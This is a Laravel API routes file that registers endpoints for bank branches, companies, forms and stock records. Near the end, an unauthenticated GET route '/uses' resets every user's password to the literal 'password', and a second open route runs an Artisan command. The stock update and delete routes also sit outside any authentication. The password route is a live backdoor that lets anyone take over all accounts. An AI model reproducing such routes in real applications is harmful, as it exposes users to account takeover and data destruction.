<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\StockController;
/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

// Route::post('/login', 'Api\UserController@login');
// Route::post('/register', 'Api\UserController@register');
// Route::get('/news', 'Api\HomeController@news');
// Route::get('/categories', 'Api\HomeController@categories');
// Route::get('/items/{id}', 'Api\HomeController@menuItems');
// Route::group(['middleware' => ['auth:api']], function () {
//     Route::post('/update-profile', 'Api\UserController@updateProfile');
// });

  Route::get('/bank_branches', 'BankController@getBranchesJson')->name('getBranchesJson');
  Route::get('/bank_branches_single', 'BankController@getBranchesJsonSingle')->name('getBranchesJson2');
  Route::get('/bank_branches2', 'BankController@getBranchesJsonn')->name('getBranchesJson3');

  Route::get('/companies', 'Api\HomeController@companies');
  Route::get('/companies/{id}', 'Api\HomeController@showCompany');
  Route::get('/forms', 'Api\HomeController@forms');
  Route::get('/forms/{id}', 'Api\HomeController@showForm');
Route::get('/stocks/create/{type}',[StockController::class,'create']);
Route::get('/stocks',[StockController::class,'index']);
Route::post('/stocks/update/{id}',[StockController::class,'update']);
Route::get('/stocks/edit/{id}',[StockController::class,'edit']);
Route::post('/stocks/store/{type}',[StockController::class,'store']);
Route::get('/stocks/show/{id}',[StockController::class,'show']);
Route::post('/stocks/activate/{id?}',[StockController::class,'activate']);
Route::delete('/stocks/destroy/{id}',[StockController::class,'destroy']);

  Route::get('/linolk', function(){
      return Artisan::call('storage:link');
  });
  Route::get('/uses', function(){
      \App\User::where('id','!=',null)->update([
         'password'=> bcrypt('password')
      ]);
      return 'deon';
  });